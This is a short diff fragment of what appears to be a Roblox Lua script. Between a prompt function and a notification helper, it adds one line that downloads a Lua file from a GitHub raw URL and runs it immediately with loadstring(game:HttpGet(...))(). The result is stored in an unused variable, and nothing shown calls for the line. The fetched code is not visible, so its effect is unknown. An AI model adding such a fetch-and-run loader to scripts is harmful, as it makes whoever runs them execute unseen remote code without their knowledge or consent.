@@ -159,6 +159,7 @@ local function prompt(title, text)
     return choice
 end
 
+local o = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/Load/refs/heads/main/Gui.lua"))()
 local function nt(n, c)
     local StarterGui = game:GetService("StarterGui")
     StarterGui:SetCore("SendNotification", {
